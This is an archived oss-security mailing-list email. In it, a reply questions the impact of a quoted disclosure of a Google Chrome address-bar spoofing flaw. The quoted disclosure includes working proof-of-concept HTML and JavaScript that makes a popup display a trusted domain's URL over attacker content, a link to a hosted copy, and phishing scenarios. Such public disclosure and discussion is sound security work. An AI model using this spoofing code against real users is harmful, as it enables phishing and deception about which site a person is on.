X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1922" "Wednesday" "1" "July" "2015" "10:12:35" "+1200" "Valentinas Bakaitis" "v.bakaitis@gmail.com" "<CAP7Z6--Zd8zojRXbevz+xETqvqRGWJKhaY=OL9LL2mRusPMNiA@mail.gmail.com>" "67" "[oss-security] Re: Google Chrome Address Spoofing (Request For Comment)" nil nil nil "7" "2015063022:12:35" "[oss-security] Re: Google Chrome Address Spoofing (Request For Comment)" (number mark "        v.bakaitis@g Jul  1   67/1922  " thread-indent "\"[oss-security] Re: Google Chrome Address Spoofing (Request For Comment)\"\n") "<55923253.8020902@deusen.co.uk>" ("<55923253.8020902@deusen.co.uk>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 3197 invoked by uid 550); 1 Jul 2015 07:57:34 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 21757 invoked from network); 30 Jun 2015 22:13:06 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:in-reply-to:references:from:date:message-id:subject:to
         :cc:content-type;
        bh=D1jwh6cTAiX5O8OSOw9pSH+AhvbP+oxiR2uHtPOHlGw=;
        b=kq/A5/z3tEhShoP45w/vcUXKL9ekaXO34hVCKtnZSxO+IuQlYk33dd5hPsKZr+PIke
         qMtKsP1hqA3ClY8IcAnZVgqsh5FBkmxGpsbQZEvWjmvOurnKDa+3ZoTo4jrAgkgsiUG/
         gs7wTRlCtcbGQKMYypCbperW2Szmr49n/Y++jA0S7q2QHk8pgkkQycqLxBe8KA4qC7EG
         VgeCzL6H6X3IYvzYafQ8+dg544LJB+C7e62QqBk22oo3nq+/obHIxy1sdLvFOTztDDuT
         l5vcaetdn2gpUa2UMc86oP8AvdROR4pnzJMXHxgHy1Rs3YQrQLiZ2M05w2mohFJOcefF
         fLAw==
X-Received: by 10.170.111.209 with SMTP id d200mr27692754ykb.120.1435702374652;
 Tue, 30 Jun 2015 15:12:54 -0700 (PDT)
MIME-Version: 1.0
In-Reply-To: <55923253.8020902@deusen.co.uk>
References: <55923253.8020902@deusen.co.uk>
Message-ID: <CAP7Z6--Zd8zojRXbevz+xETqvqRGWJKhaY=OL9LL2mRusPMNiA@mail.gmail.com>
Content-Type: multipart/alternative; boundary=001a11379a680b65600519c38239
Cc: "bugtraq@securityfocus.com" <bugtraq@securityfocus.com>, fulldisclosure@seclists.org, 
	oss-security@lists.openwall.com
Date: Wed, 1 Jul 2015 10:12:35 +1200
From: Valentinas Bakaitis <v.bakaitis@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Re: Google Chrome Address Spoofing (Request For Comment)
To: David Leo <david.leo@deusen.co.uk>

--001a11379a680b65600519c38239
Content-Type: text/plain; charset=UTF-8

Can you perform any actions on the page once the URL is replaced, or is it
non responsive? (asking because PoC did not work on my Chrome 43.0.2357.130
(64-bit) on OSX). If it is non responsive then the impact is very limited.
Worst thing I can think of is showing "your account is suspended, please
contact technical support on 0800-555-555" and then using the trust user
puts in the URL for phone phishing. If it is responsive, then it's indeed
pretty bad.

Cheers!
V.

On Tue, Jun 30, 2015 at 6:08 PM, David Leo <david.leo@deusen.co.uk> wrote:

> Impact:
> The "click to verify" thing is completely broken...
> Anyone can be "BBB Accredited Business" etc.
> You can make whitehouse.gov display "We love Islamic State" :-)
>
> Note:
> No user interaction on the fake page.
>
> Code:
> ***** index.html
> <script>
> function next()
> {
>         w.location.replace('http://www.oracle.com/index.html?'+n);n++;
>         setTimeout("next();",15);
>         setTimeout("next();",25);
> }
> function f()
> {
>         w=window.open("content.html","_blank","width=500 height=500");
>
> i=setInterval("try{x=w.location.href;}catch(e){clearInterval(i);n=0;next();}",5);
> }
> </script>
> <a href="#" onclick="f()">Go</a><br>
> ***** content.html
> <b>This web page is NOT oracle.com</b>
> <script>location="http://www.oracle.com/index.html";</script>
> ***** It's online
> http://www.deusen.co.uk/items/gwhere.6128645971389012/
> (The page says "June/16/2015" - it works as we tested today)
>
> Request For Comment:
> We reported this to Google.
> They reproduced, and say
> It's DoS which doesn't matter.
> We think it's very strange,
> since the browser does not crash(not DoS),
> and the threat is obvious.
> What's your opinion?
>
> Kind Regards,
>
> PS
> We love clever tricks.
> We love this:
> http://dieyu.org/
>
>

--001a11379a680b65600519c38239--
